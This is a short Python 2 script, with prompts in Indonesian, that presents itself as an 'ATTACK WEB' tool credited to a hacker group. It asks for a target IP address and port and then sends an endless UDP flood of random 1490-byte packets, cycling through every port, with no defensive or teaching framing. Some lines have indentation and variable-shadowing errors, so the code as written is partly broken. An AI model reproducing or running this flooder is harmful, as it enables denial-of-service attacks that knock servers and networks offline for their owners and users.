import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print "Siapa Nama Kamu?"
input= raw_input("Ketik : ")
print "TERIMAKASIH TELAH MENGGUNAKAN TOOLS INI"

os.system("figlet ATTACK WEB")
print
    print "======================================================="
    print "= OWNED      : HECKAXPLOIT TZY - 666                  ="
    print "= SCRIPT     : https://github.com/TeamSBW/CYBERDDOS   ="
    print "= COMMUNITY  : SEKTE BYPASS ADMIN ARE INDONESIA       ="
    print "======================================================="
print
ip = raw_input("IP TARGET ? : ")
port = input("PORT TARGET ?     : ")

os.system("clear")
print "Apakah Anda Yakin Ingin Melanjutkan?"
next= raw_input("KETIK YA UNTUK MELANJUTKAN :  ")

os.system("clear")
os.system("figlet Sedang Mengirim Paket")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Mengirim %s Paket %s Ke Port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
